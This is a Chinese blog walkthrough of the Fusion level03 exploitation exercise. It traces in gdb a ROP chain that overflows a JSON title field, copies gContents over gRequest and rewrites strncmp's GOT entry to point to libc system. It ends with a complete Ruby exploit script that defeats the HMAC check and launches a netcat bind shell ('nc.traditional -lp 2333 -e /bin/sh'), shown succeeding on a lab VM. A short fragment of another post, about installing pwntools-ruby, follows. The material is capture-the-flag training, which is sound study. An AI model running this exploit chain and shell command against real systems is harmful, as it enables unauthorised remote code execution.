SIGSEGV, Segmentation fault. 0x44434241 in ?? () 没问题\u0026hellip;能用\n绕了这么多路终于快解决了吧..\n然后替换成我们的 ROP Chain：\ndef p32 addr return [addr].pack \u0026#39;I\u0026#39; end title = \u0026#34;w\u0026#34; * 127 title += \u0026#39;\\\\\\\\\\uAAAA\u0026#39; title += \u0026#34;w\u0026#34; * 23 title += \u0026#34;ABCD\u0026#34; title += \u0026#34;ABCD\u0026#34; title += p32 0x08048bf0 title += p32 0xAAA9B858 title += p32 0x08049b4f title += p32 0xFFF7B860 title += \u0026#34;w\u0026#34; * 0x5c title += p32 0x080493fe title += p32 0x08048d40 title += p32 0x12345678 title += p32 0x0804bdf4 以及在 contents 里写上 system 的参数\nhash = { :tags =\u0026gt; [\u0026#39;meme\u0026#39;], # Ruby to_json issue with error \u0026#34;illegal/malformed utf-8\u0026#34; :title =\u0026gt; \u0026#39;_replace_\u0026#39;, :contents =\u0026gt; \u0026#39;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#39;, :serverip =\u0026gt; \u0026#39;192.168.215.135:8080\u0026#39; } puts \u0026#34;==\u0026gt; original json:\u0026#34; json = hash.to_json puts json puts \u0026#34;==\u0026gt; replaced json:\u0026#34; json = json.dup.sub! \u0026#34;_replace_\u0026#34;, title puts json 试一下！！！\n# 断点打在 \u0026lt;write@plt\u0026gt;: (gdb) break *0x08048d40 Breakpoint 1 at 0x8048d40 (gdb) c Continuing. Breakpoint 1, 0x08048d40 in write@plt () (gdb) info reg eax 0xfff7b860\t-542624 ecx 0xb7541398\t-1219226728 edx 0xffffffff\t-1 ebx 0xaaa9b858\t-1431717800 esp 0xbfb7d6a0\t0xbfb7d6a0 ebp 0x77777777\t0x77777777 esi 0x77777777\t2004318071 edi 0x77777777\t2004318071 eip 0x8048d40\t0x8048d40 \u0026lt;write@plt\u0026gt; eflags 0x283\t[ CF SF IF ] cs 0x73\t115 ss 0x7b\t123 ds 0x7b\t123 es 0x7b\t123 fs 0x0\t0 gs 0x33\t51 (gdb) si __libc_system (line=0x804bdf4 \u0026#34;X\\220t\\t\\b\\200t\\t\\220\\230t\\t\\034\\001\u0026#34;) at ../sysdeps/posix/system.c:179 179\t../sysdeps/posix/system.c: No such file or directory. in ../sysdeps/posix/system.c __libc_system！！成功了！！但是没有完全成功\u0026hellip;？\n虽然确实跳到了 system，但是参数怪怪的\u0026hellip;\n(gdb) x/s 0x804bdf4 0x804bdf4 \u0026lt;gContents\u0026gt;:\t\u0026#34;X\\220t\\t\\b\\200t\\t\\220\\230t\\t\\034\\001\u0026#34; (gdb) x/s *0x804bdf4 0x9749058:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; # 重启了几次程序 (gdb) x/s *0x804bdf4 0x9776838:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; (gdb) x/s *0x804bdf4 0x97f2058:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; (gdb) x/s *0x804bdf4 0x99e6058:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; 麻袋..所以..\ngContents 实际保存的值在..\n(gdb) x/s *0x804bdf4 0x97f2058:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; (gdb) info proc map process 1682 cmdline = \u0026#39;/opt/fusion/bin/level03\u0026#39; cwd = \u0026#39;/\u0026#39; exe = \u0026#39;/opt/fusion/bin/level03\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804b000 0x3000 0 /opt/fusion/bin/level03 0x804b000 0x804c000 0x1000 0x2000 /opt/fusion/bin/level03 0x97f1000 0x9812000 0x21000 0 [heap] ...... 在会受 ASLR 影响的堆上\u0026hellip;.\n／ ／｜ーーーーーーーーーーーーーーーーーーー｜ | Ｔｏ　ｂｅ　ｃｏｎｔｉｎｕｅｄ　｜　＼｜ーーーーーーーーーーーーーーーーーーー｜ ＼ The TRUE Solution 严格来说，gContents 这个变量，在 .bss 段内；\n（.bss 和 .data 还是有点区别的）\nBSS refers to uninitialized global and static objects and Data refers to initialized global and static objects.\n其地址为 0x804bdf4，没开 PIE 所以这个倒是不会变的\n但是，这个地址里面保存的值，指向了受 ASLR 影响的堆\n(gdb) x 0x804bdf4 # 即 *.bss 上指向堆的地址* 0x804bdf4 \u0026lt;gContents\u0026gt;:\t0x09b3e710 (gdb) x/s 0x09b3e710 # 即 *堆上 gContents 的地址* 0x9b3e710:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; 我们想要 system 的话，参数写的必须得是 堆上 gContents 的地址 而不是 .bss 上指向堆的地址\n我试着谷歌了别人的解法，虽然前面思路都差不多，但是到最后一步的时候他们直接用 \u0026quot;/////////////bin/nc.traditional\u0026quot; 也就是加一堆（几百个）正斜杠，来绕开 ASLR\u0026hellip;.我觉得不行（因为实际地址有时候 0x99????? 有时候 0x89?????，差了快有 0x10000 了\u0026hellip;.\n我也自己试了很多 ROP chain，都没法用诸如 dword ptr 的指令来把 .bss 上指向堆的地址 里保存的 堆上 gContents 的地址 拿出来\n我也试着就把 nc 的命令写在栈上，然后试着用 ROP chain 来把 esp 的值取出来去做为 system 的参数，但是也没有合适的 ROP chain\n就这样浪费了快一个上午，简直要疯了\n甚至差点就用 memcpy 把 system 的参数，既然是一个字符串，那就从地址固定的 .text 段里，一字节一字节的找出来，取出来，放到 .bss 上\u0026hellip;\n然后差点真的这么实施的时候想起来一个问题：\n原程序是怎么从 .bss 上指向堆的地址 来读到 堆上 gContents 的地址 呢\u0026hellip;\n比如，void validate_request() 里的这个 strncmp\nif(strncmp(gRequest, token, strlen(token)) != 0) errx(EXIT_FAILURE, \u0026#34;Token not found!\u0026#34;); gdb:\n(gdb) disas validate_request Dump of assembler code for function validate_request: 0x08049ab0 \u0026lt;+0\u0026gt;:\tsub $0x5c,%esp 0x08049ab3 \u0026lt;+3\u0026gt;:\tmov %ebx,0x4c(%esp) 0x08049ab7 \u0026lt;+7\u0026gt;:\tmov 0x804bdf8,%ebx 0x08049abd \u0026lt;+13\u0026gt;:\tmov %esi,0x50(%esp) 0x08049ac1 \u0026lt;+17\u0026gt;:\tmov %edi,0x54(%esp) 0x08049ac5 \u0026lt;+21\u0026gt;:\tmov %ebp,0x58(%esp) 0x08049ac9 \u0026lt;+25\u0026gt;:\tmov %ebx,(%esp) 0x08049acc \u0026lt;+28\u0026gt;:\tcall 0x8048e70 \u0026lt;strlen@plt\u0026gt; 0x08049ad1 \u0026lt;+33\u0026gt;:\tmov 0x804be08,%esi 0x08049ad7 \u0026lt;+39\u0026gt;:\tmov %ebx,0x4(%esp) 0x08049adb \u0026lt;+43\u0026gt;:\tmov %esi,(%esp) 0x08049ade \u0026lt;+46\u0026gt;:\tmov %eax,0x8(%esp) 0x08049ae2 \u0026lt;+50\u0026gt;:\tcall 0x8048f50 \u0026lt;strncmp@plt\u0026gt; ...... (gdb) break *0x08049ae2 Breakpoint 1 at 0x8049ae2: file level03/level03.c, line 75. (gdb) c Continuing. Breakpoint 1, 0x08049ae2 in validate_request () at level03/level03.c:75 75\tlevel03/level03.c: No such file or directory. in level03/level03.c 断点打在了 strncmp 之前，看一下此刻的栈\u0026hellip;\n(gdb) x/4wx $esp 0xbf8894a0: [0x09b3d050] [0x09b3d008] 0x00000040 0x0804bd38 # if(strncmp(gRequest, token, strlen(token)) != 0) (gdb) x gRequest 0x9b3d050:\t\u0026#34;// 192.168.215.1:65435-1654326447-1806178287-708944567-892684320\\n{\\\u0026#34;tags\\\u0026#34;:[\\\u0026#34;meme\\\u0026#34;],\\\u0026#34;title\\\u0026#34;:\\\u0026#34;\u0026#34;, \u0026#39;w\u0026#39; \u0026lt;repeats 109 times\u0026gt;... (gdb) x token 0x9b3d008:\t\u0026#34;// 192.168.215.1:65435-1654326447-1806178287-708944567-892684320\u0026#34; 0x00000040: strlen(token) 所以这两个值不就是 堆上 gRequest 的地址 和 堆上 token 的地址 么\u0026hellip;被 strncmp 之前的指令放在了栈上\u0026hellip;\n这时候我突然意识到，我前面一直在和 ROP chain 对线，却忘了一个最简单的事情：\n有些时候找不到 ROP Chain 不代表源程序没做过这个事情，而是源程序做了这个事情但是没有立刻 ret\n换句话说，我们不用再死磕想去把 堆上 gContents 的地址 写到栈上作为 system 的参数，\n而是可以利用 .text 中原有的指令，来让栈变成有 堆上 gContents 的地址 的形状，虽然此时没法立刻 ret\u0026hellip;但是，如果接下来的指令中又出现了一个我们所想要的 call..那就完全不需要 ret 了啊\n这里的 strncmp 就是很好的例子，在执行它之前，栈确确实实被其之前的指令变成了有 堆上 gRequest 的地址 的形状，如果这一刻的 strncmp 和 gRequest 都可以在之前就被偷偷换成别的东西\u0026hellip;?\n我们已知：\n.bss，.text，.plt 段地址不变 strncmp 之前会把 堆上 gRequest 的地址 取出来放到栈上 堆上 gRequest 的地址 保存在 .bss 上指向堆的地址 .bss 字段可写 那么我们现在就可以：\n把 .bss 的 gRequest 偷偷用 memcpy 替换成 gContent 把 strncmp 偷偷换成 libc system strncmp(gRequest, token, strlen(token) 时，就变成了 system(gContents)（虽然多的两个参数 system 根本就不会管它 来吧，全新的 ROP Chain：\n1. .bss: gRequest -\u0026gt; gContent\n这里使用 memcpy 好了，那么就需要把栈变成这样：\n# gRequest -\u0026gt; gContents # memcpy(void *restrict dst, const void *restrict src, size_t n) 1. 0x08048e60 # memcpy 的 plt 地址 2. 0x0804964d # memcpy 的返回地址：pop ebx ; pop esi ; pop edi ; ret # 这条语句可以连 pop 三个值，就可以把下面三个 memcpy 的参数弹栈 2. 0x0804be08 # 目的地址：.bss 段的 0x804be08 \u0026lt;gRequest\u0026gt; 3. 0x0804bdf4 # 原地址：.bss 段的 0x804bdf4 \u0026lt;gContents\u0026gt; 4. \u0026#39;\\\\\\\\\\u0400\u0026#39; + \u0026#39;\\\\\\\\\\u0000\u0026#39; # memcpy 的参数：拷贝的数据大小 # 这里就相当于 0x00000004 字节 试一下：\ntitle = \u0026#34;w\u0026#34; * 127 title += \u0026#39;\\\\\\\\\\uAAAA\u0026#39; title += \u0026#34;w\u0026#34; * 27 title += \u0026#34;ABCD\u0026#34; #ebp # gRequest -\u0026gt; gContents # memcpy(void *restrict dst, const void *restrict src, size_t n) : 0x08048e60 title += p32 0x08048e60 # memcpy title += p32 0x0804964d # return addr : pop ebx ; pop esi ; pop edi ; ret title += p32 0x0804be08 # *dest 0x804be08 \u0026lt;gRequest\u0026gt; title += p32 0x0804bdf4 # *src 0x804bdf4 \u0026lt;gContents\u0026gt; title += \u0026#39;\\\\\\\\\\u0400\u0026#39; + \u0026#39;\\\\\\\\\\u0000\u0026#39; # size = 0x00000004 title += p32 0x23332333 # sigsegv for test (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x23332333 in ?? () (gdb) x gContents 0x98c8710:\t0x63756f74 (gdb) x gRequest 0x98c8710:\t0x63756f74 (gdb) x/s 0x98c8710 0x98c8710: \u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; 成功w\n2. .plt.got: strncmp -\u0026gt; system\n(gdb) info proc map process 1684 cmdline = \u0026#39;/opt/fusion/bin/level03\u0026#39; cwd = \u0026#39;/\u0026#39; exe = \u0026#39;/opt/fusion/bin/level03\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804b000 0x3000 0 /opt/fusion/bin/level03 0x804b000 0x804c000 0x1000 0x2000 /opt/fusion/bin/level03 0x98c7000 0x98e8000 0x21000 0 [heap] ...... 0xb752a000 0xb76a0000 0x176000 0 /lib/i386-linux-gnu/libc-2.13.so 0xb76a0000 0xb76a2000 0x2000 0x176000 /lib/i386-linux-gnu/libc-2.13.so 0xb76a2000 0xb76a3000 0x1000 0x178000 /lib/i386-linux-gnu/libc-2.13.so ...... (gdb) p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7566b20 \u0026lt;__libc_system\u0026gt; (gdb) p strncmp $2 = {\u0026lt;text gnu-indirect-function variable, no debug info\u0026gt;} 0xb75a0530 \u0026lt;strncmp\u0026gt; 那么偏移量是：0xb7566b20 \u0026lt;__libc_system\u0026gt; - 0xb75a0530 \u0026lt;strncmp\u0026gt; = 0xFFFC65F0\n直接套 Find Out ROP chain 节最后的 ROP Chain：\n# GOT fusion@fusion:~$ objdump -R /opt/fusion/bin/level03 | grep strncmp 0804bda0 R_386_JUMP_SLOT strncmp # PLT fusion@fusion:~$ objdump -d /opt/fusion/bin/level03 | grep strncmp 08048f50 \u0026lt;strncmp@plt\u0026gt;: 8049ae2:\te8 69 f4 ff ff call 8048f50 \u0026lt;strncmp@plt\u0026gt; # funcA -\u0026gt; strncmp 1. 0x08048bf0 : pop ebx ; ret # 作用是把 2. 的值写进 ebx 2. # 在这里放上「funcA 的 got 地址 - 0x5d5b04c4」 #（减去这个数字是因为 6. 的 ebx 大了 0x5d5b04c4 0x0804bda0 - 0x5d5b04c4 =\u0026gt; 0xAAA9B8DC 3. 0x08049b4f : pop eax ; add esp, 0x5c ; ret # 作用是把 4. 的值写进 eax 4. # 「libc 里面，funcA 的地址 到 libc_system 的地址」之间的偏移量 =\u0026gt; 0xFFFC65F0 5. # 这里得写上 0x5c 个字符，因为 3. 出现了 add esp, 0x5c 6. 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret # 成功改写了 funcA 的 got 记录： # 即加上偏移量，变成了 system 的地址 即：\n# strncmp -\u0026gt; system title += p32 0x08048bf0 # pop ebx ; ret title += p32 0xAAA9B8DC # ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4 title += p32 0x08049b4f # pop eax ; add esp, 0x5c ; ret title += p32 0xFFFC65F0 # offset of libc system and strncmp title += \u0026#34;w\u0026#34; * 0x5c title += p32 0x080493fe # add dword ptr [ebx + 0x5d5b04c4], eax ; ret title += p32 0x08048f50 # call \u0026lt;strncmp@plt\u0026gt; just for test \u0026hellip;.但是却遇到了这样的问题：\n(gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0xb76042d0 in __argp_fmtstream_update (fs=0xb787fff4) at argp-fmtstream.c:238 238\targp-fmtstream.c: No such file or directory. in argp-fmtstream.c (gdb) x 0x0804bda0 0x804bda0 \u0026lt;strncmp@got.plt\u0026gt;:\t0xb76042d0 (gdb) x 0xb76042d0 0xb76042d0 \u0026lt;__argp_fmtstream_update+352\u0026gt;:\t0x158b65ff (gdb) p system $3 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7566b20 \u0026lt;__libc_system\u0026gt; \u0026lt;strncmp@got.plt\u0026gt; 改了，但并没有指向 system \u0026hellip;\n偏移应该没有算错呢\u0026hellip;.\n就算去 objdump -d libc.so 得出的也是同样的偏移\nGNU Indirect Function 问题似乎出现在这里：\n(gdb) p strncmp $1 = {\u0026lt;text gnu-indirect-function variable, no debug info\u0026gt;} 0xb75a0530 \u0026lt;strncmp\u0026gt; (gdb) p memcpy $5 = {\u0026lt;text gnu-indirect-function variable, no debug info\u0026gt;} 0xb75a1a60 \u0026lt;memcpy\u0026gt; (gdb) p system $3 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7566b20 \u0026lt;__libc_system\u0026gt; (gdb) p write $4 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb75eb2c0 \u0026lt;write\u0026gt; (gdb) x 0x0804bda0 0x804bda0 \u0026lt;strncmp@got.plt\u0026gt;:\t0xb763dce0 system 和 write 都是 \u0026lt;text variable, no debug info\u0026gt;，但是 strncmp 和 memcpy 是 \u0026lt;text gnu-indirect-function variable, no debug info\u0026gt;\u0026hellip;?\n这个 indirect 是什么意思呢？\nGNU indirect function (ifunc) is a mechanism making a direct function call resolve to an implementation picked by a resolver. It is mainly used in glibc but has adoption in FreeBSD.\nFor some performance critical functions, e.g. memcpy/memset/strcpy, glibc provides multiple implementations optimized for different architecture levels. The application just uses memcpy(\u0026hellip;) which compiles to call memcpy. The linker will create a PLT for memcpy and produce an associated special dynamic relocation referencing the resolver symbol/address. During relocation resolving at runtime, the return value of the resolver will be placed in the GOT entry and the PLT entry will load the address.\nOn Mach-O, there is a similar feature called N_SYMBOL_RESOLVER. GNU indirect function - MaskRay\n啊\u0026hellip;好麻烦x 以后再看看吧\n总之重新换个方式算偏移\u0026hellip;\n(gdb) p strncmp $3 = {\u0026lt;text gnu-indirect-function variable, no debug info\u0026gt;} 0xb75a0530 \u0026lt;strncmp\u0026gt; (gdb) x strncmp 0xb75a0530 \u0026lt;strncmp\u0026gt;:\t0x762de853 (gdb) x 0x0804bda0 0x804bda0 \u0026lt;strncmp@got.plt\u0026gt;:\t0xb763dce0 # 可见 p strncmp 和 x strncmp 的结果是一样的 # 但是又和直接 x strncmp@got.plt 的结果不一样 (gdb) p system $4 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7566b20 \u0026lt;__libc_system\u0026gt; # 用 x strncmp@got.plt 的结果算出的偏移量为：0xFFF28E40 # 重启程序再试一次： (gdb) x 0x0804bda0 0x804bda0 \u0026lt;strncmp@got.plt\u0026gt;:\t0xb7600ce0 (gdb) p system $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7529b20 \u0026lt;__libc_system\u0026gt; # 这时候的偏移量也是 0xFFF28E40，好耶！ 那么修改为如下：\n# strncmp -\u0026gt; system title += p32 0x08048bf0 # pop ebx ; ret title += p32 0xAAA9B8DC # ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4 title += p32 0x08049b4f # pop eax ; add esp, 0x5c ; ret title += p32 0xFFF28E40 # offset of libc system and strncmp # x strncmp@got.plt title += \u0026#34;w\u0026#34; * 0x5c title += p32 0x080493fe # add dword ptr [ebx + 0x5d5b04c4], eax ; ret title += p32 0x08048f50 # call \u0026lt;strncmp@plt\u0026gt; just for test 在 add dword ptr [ebx + 0x5d5b04c4], eax ; ret 打断点：\nBreakpoint 1, 0x080493fe in __do_global_dtors_aux () at level03/level03.c:257 257\tlevel03/level03.c: No such file or directory. in level03/level03.c (gdb) info reg eax 0xfff28e40\t-881088 ecx 0x9f37710\t166950672 edx 0x804be0c\t134528524 ebx 0xaaa9b8dc\t-1431717668 ...... (gdb) x $ebx + 0x5d5b04c4 0x804bda0 \u0026lt;strncmp@got.plt\u0026gt;:\t0xb7600ce0 (gdb) x/i 0xb7600ce0 0xb7600ce0 \u0026lt;__strncmp_sse4_2\u0026gt;:\tpush %ebp # 前进一步就该是 system 了： (gdb) x/x 0x804bda0 0x804bda0 \u0026lt;strncmp@got.plt\u0026gt;:\t0xb7529b20 (gdb) x/i 0xb7529b20 0xb7529b20 \u0026lt;__libc_system\u0026gt;:\tsub $0x10,%esp 成功！！！！\noaoaowuuuwuaoaoaowuoouawuaouoyeyeyeyehkoaao\n（到这一步又花了一个下午加一个晚上的时间）\n（真的，哭死）\nEND. 终于要结束了吧\u0026hellip;\n把这些东西组合起来\u0026hellip;\n(gdb) x/i validate_request 0x8049ab0 \u0026lt;validate_request\u0026gt;:\tsub $0x5c,%esp title = \u0026#34;w\u0026#34; * 127 title += \u0026#39;\\\\\\\\\\uAAAA\u0026#39; title += \u0026#34;w\u0026#34; * 27 title += \u0026#34;ABCD\u0026#34; #ebp # gRequest -\u0026gt; gContents # memcpy(void *restrict dst, const void *restrict src, size_t n) : 0x08048e60 title += p32 0x08048e60 # memcpy title += p32 0x0804964d # return addr : pop ebx ; pop esi ; pop edi ; ret title += p32 0x0804be08 # *dest 0x804be08 \u0026lt;gRequest\u0026gt; title += p32 0x0804bdf4 # *src 0x804bdf4 \u0026lt;gContents\u0026gt; title += \u0026#39;\\\\\\\\\\u0400\u0026#39; + \u0026#39;\\\\\\\\\\u0000\u0026#39; # size = 0x00000004 # title += p32 0x23332333 # sigsegv for test # strncmp -\u0026gt; system title += p32 0x08048bf0 # pop ebx ; ret title += p32 0xAAA9B8DC # ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4 title += p32 0x08049b4f # pop eax ; add esp, 0x5c ; ret title += p32 0xFFF28E40 # offset of libc system and strncmp # x strncmp@got.plt title += \u0026#34;w\u0026#34; * 0x5c title += p32 0x080493fe # add dword ptr [ebx + 0x5d5b04c4], eax ; ret # title += p32 0x08048f50 # call \u0026lt;strncmp@plt\u0026gt; just for test # we replaced strncmp with system # and replaced gRequest with gContents # now the strncmp in \u0026lt;validate_request\u0026gt; acts like: # system(gContents) title += p32 0x8049ab0 # \u0026lt;validate_request\u0026gt; 然后在那个可怜的 strncmp(gRequest, token, strlen(token)) 前打断点吧\n(gdb) disas validate_request Dump of assembler code for function validate_request: 0x08049ab0 \u0026lt;+0\u0026gt;:\tsub $0x5c,%esp 0x08049ab3 \u0026lt;+3\u0026gt;:\tmov %ebx,0x4c(%esp) 0x08049ab7 \u0026lt;+7\u0026gt;:\tmov 0x804bdf8,%ebx 0x08049abd \u0026lt;+13\u0026gt;:\tmov %esi,0x50(%esp) 0x08049ac1 \u0026lt;+17\u0026gt;:\tmov %edi,0x54(%esp) 0x08049ac5 \u0026lt;+21\u0026gt;:\tmov %ebp,0x58(%esp) 0x08049ac9 \u0026lt;+25\u0026gt;:\tmov %ebx,(%esp) 0x08049acc \u0026lt;+28\u0026gt;:\tcall 0x8048e70 \u0026lt;strlen@plt\u0026gt; 0x08049ad1 \u0026lt;+33\u0026gt;:\tmov 0x804be08,%esi 0x08049ad7 \u0026lt;+39\u0026gt;:\tmov %ebx,0x4(%esp) 0x08049adb \u0026lt;+43\u0026gt;:\tmov %esi,(%esp) 0x08049ade \u0026lt;+46\u0026gt;:\tmov %eax,0x8(%esp) 0x08049ae2 \u0026lt;+50\u0026gt;:\tcall 0x8048f50 \u0026lt;strncmp@plt\u0026gt; ...... (gdb) break *0x8049ae2 Breakpoint 1 at 0x8049ae2: file level03/level03.c, line 75. (gdb) c Continuing. Breakpoint 1, 0x08049ae2 in validate_request () at level03/level03.c:75 75\tlevel03/level03.c: No such file or directory. in level03/level03.c (gdb) c Continuing. Breakpoint 1, 0x08049ae2 in validate_request () at level03/level03.c:75 75\tin level03/level03.c （记得要第二次到断点的时候才是我们替换完之后手动跳 validate_request 的时候\n(gdb) x/4wx $esp 0xbf852db8:\t0x09f37708\t0x09f36008\t0x0000003f\t0x77777777 (gdb) x/s 0x09f37708 0x9f37708:\t\u0026#34;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#34; (gdb) c Continuing. root@fusion:~# netstat -ap | grep nc.traditional tcp 0 0 *:2333 *:* LISTEN 2065/nc.traditional 成..成功了\u0026hellip;.\n❯ nc 192.168.215.135 2333 id uid=20003 gid=20003 groups=20003 uname -a Linux fusion 3.0.0-13-generic-pae #22-Ubuntu SMP Wed Nov 2 15:17:35 UTC 2011 i686 i686 i386 GNU/Linux exit 心情激动，但是说不出话\n最后是完整的脚本\n#!/usr/bin/ruby # encoding: ASCII-8BIT require \u0026#39;socket\u0026#39; require \u0026#39;openssl\u0026#39; require \u0026#39;securerandom\u0026#39; require \u0026#39;json\u0026#39; # print \u0026#39;==\u0026gt; Enter hostname:\u0026#39; hostname = \u0026#39;192.168.215.135\u0026#39; # hostname = gets.chomp port = 20003 $socket = TCPSocket.open(hostname, port) def press_to_c print \u0026#39;==\u0026gt; press enter to continue\u0026#39; gets end # Trim the double quotes from the beginning and end of the string token = $socket.gets token = token[1..token.length - 3] puts \u0026#34;==\u0026gt; received token:\\n#{token}\u0026#34; =begin ... invalid = result[0] | result[1]; if(invalid) errx(EXIT_FAILURE, \u0026#34;Checksum failed!...... ... so the first two bytes of hmac must be \\x00 to do this we must generate a random string and try to hmac it several times until the first two bytes of result are \\x00 the real vuln is in decode_string() if the 127 character is \u0026#39;\\\u0026#39; than it will try to parse the 128 character if the 128 character is \u0026#39;u\u0026#39; than it will try to parse next four character than while(*src \u0026amp;\u0026amp; dest != end) will always be true which allows us to write as many characterss as we want =end def p32 addr return [addr].pack \u0026#39;I\u0026#39; end title = \u0026#34;w\u0026#34; * 127 title += \u0026#39;\\\\\\\\\\uAAAA\u0026#39; title += \u0026#34;w\u0026#34; * 27 title += \u0026#34;ABCD\u0026#34; #ebp # gRequest -\u0026gt; gContents # memcpy(void *restrict dst, const void *restrict src, size_t n) : 0x08048e60 title += p32 0x08048e60 # memcpy title += p32 0x0804964d # return addr : pop ebx ; pop esi ; pop edi ; ret title += p32 0x0804be08 # *dest 0x804be08 \u0026lt;gRequest\u0026gt; title += p32 0x0804bdf4 # *src 0x804bdf4 \u0026lt;gContents\u0026gt; title += \u0026#39;\\\\\\\\\\u0400\u0026#39; + \u0026#39;\\\\\\\\\\u0000\u0026#39; # size = 0x00000004 # title += p32 0x23332333 # sigsegv for test # strncmp -\u0026gt; system title += p32 0x08048bf0 # pop ebx ; ret title += p32 0xAAA9B8DC # ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4 title += p32 0x08049b4f # pop eax ; add esp, 0x5c ; ret title += p32 0xFFF28E40 # offset of libc system and strncmp # x strncmp@got.plt title += \u0026#34;w\u0026#34; * 0x5c title += p32 0x080493fe # add dword ptr [ebx + 0x5d5b04c4], eax ; ret # title += p32 0x08048f50 # call \u0026lt;strncmp@plt\u0026gt; just for test # we replaced strncmp with system # and replaced gRequest with gContents # now the strncmp in \u0026lt;validate_request\u0026gt; acts like: # system(gContents) title += p32 0x8049ab0 # \u0026lt;validate_request\u0026gt; hash = { :tags =\u0026gt; [\u0026#39;meme\u0026#39;], # Ruby to_json issue with error \u0026#34;illegal/malformed utf-8\u0026#34; # https://stackoverflow.com/questions/18067203/ruby-to-json-issue-with-error-illegal-malformed-utf-8 :title =\u0026gt; \u0026#39;_replace_\u0026#39;,#.to_s.force_encoding(\u0026#39;ISO-8859-1\u0026#39;), :contents =\u0026gt; \u0026#39;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#39;, #\u0026#39;/bin/nc.traditional -lp 2333 -e /bin/sh\u0026#39;, :serverip =\u0026gt; \u0026#39;192.168.215.135:8080\u0026#39; } puts \u0026#34;==\u0026gt; original json:\u0026#34; json = hash.to_json puts json.inspect puts \u0026#34;==\u0026gt; replaced json:\u0026#34; json = json.dup.sub! \u0026#34;_replace_\u0026#34;, title puts json.inspect puts \u0026#34;==\u0026gt; calculating hmac...\u0026#34; while true do # random string to make the result of hmac different every time ranstr = SecureRandom.hex #json = hash.to_json # add this \u0026#34;\\n\u0026#34; to seperate token and payload # or the json_tokener_parse(gRequest) in parse_request() will not work payload = token + \u0026#34;\\n\u0026#34; + json + ranstr hmac = OpenSSL::HMAC.hexdigest \u0026#39;SHA1\u0026#39;, token, payload if hmac[0..3] == \u0026#34;0000\u0026#34; then puts \u0026#34;done\u0026#34; puts \u0026#34;==\u0026gt; use random string:\\n\u0026#34; + ranstr puts \u0026#34;==\u0026gt; created payload:\\n\u0026#34; + payload.inspect puts \u0026#34;==\u0026gt; hmac result:\\n\u0026#34; + hmac # \u0026#34;00008ad10c00e3...\u0026#34; =\u0026gt; \u0026#34;\\x00\\x00\\x8A\\xD1\\f\\x00\\xE3...\u0026#34; hmac = [hmac].pack \u0026#39;H*\u0026#39; break end end $socket.write payload press_to_c =begin ... while(1) { ret = read(0, gRequest + gRequestSize, gRequestMax - gRequestSize); if(ret == 0) break; ... BasicSocket#close_write: Disallows further write using shutdown system call. use this to make read return 0 use $socket.close will cause Broken Pipe =end $socket.close_write system \u0026#34;nc #{hostname} 2333\u0026#34; 但是姑且还是把 Fusion 的题目全做完了再一起传吧\n以及草稿\n真的试了好多好多次\u0026hellip;\n前后加起来有三个星期才总算把这个做出来\n从因为疫情被封的三月中旬到现在，也就两个半月的时间\n真的学到了好多\u0026hellip;\n从完全不会 pwn 到 现在第一次自己成功 ROP\n还顺带喜欢上了 ruby 和 vim x\n还顺便养成了看英文资料的习惯（或者说根本就找不到多少相关的中文资料\n这一切都是命运石之门的选择x\n不过明天真的就要返校了..\n姑且把开了几个月的 Terminal 和 Safari 标签页都关掉了\u0026hellip;\n再打开来的话大概是七月了呢\u0026hellip;\n啊总之笔记本没电了，先爬爬x\nThanks for reading.\nSponsors:\nMy not-yet-arrived keyboard\nCute cats in the compound\nMacOS Calculator\nMy IKEA Shark Hikari.Sa（鲨·光光\nBaka Minty w\n","date":"2022-05-30T00:00:00Z","image":"/p/fusion_level_03/cover_hu574291cd7b329f663b2ad48fb6ab2524_1741229_120x120_fill_box_smart1_3.png","permalink":"/p/fusion_level_03/","title":"Fusion Level 03 Walkthrough"},{"content":"不想写各种正经的 pwn 练习题的做法了\n放飞自我一下（\n起因是我想试一下在 GitHub 上找到的 pwntools-ruby\n试着执行了一下它的例子，但是很快啊，就这样了：\n...... Could not open library \u0026#39;keystone\u0026#39;: dlopen(keystone, 0x0005): tried: \u0026#39;keystone\u0026#39; (no such file), \u0026#39;/usr/local/lib/keystone\u0026#39; (no such file), \u0026#39;/usr/lib/keystone\u0026#39; (no such file), \u0026#39;/Users/senri/Downloads/keystone\u0026#39; (no such file). (LoadError) ...... 原来是缺一个叫 keystone 的框架\u0026hellip;那就试着装一下\n❯ make install /Library/Developer/CommandLineTools/usr/bin/make gen_const cd .. \u0026amp;\u0026amp; python const_generator.py ruby /bin/sh: python: command not found make[1]: *** [gen_const] Error 127 make: *** [install] Error 2 找不到 python\u0026hellip;?\n❯ sudo vim /etc/profile alias python=\u0026#39;python2\u0026#39; ❯ sh sh-3.2$ python sh: python: command not found 然后怎么改也没用\u0026hellip;\n其实上面几个连环问题并不是如此轻易的找到了解决办法，\n就像走迷宫遇到一个分叉，走了几步发现是死路就又绕回来走另一个分叉，然后又遇到另一个分叉，进去转了一圈发现又是死路\n不知道绕了多少弯路才终于遇到了刚刚那个 python 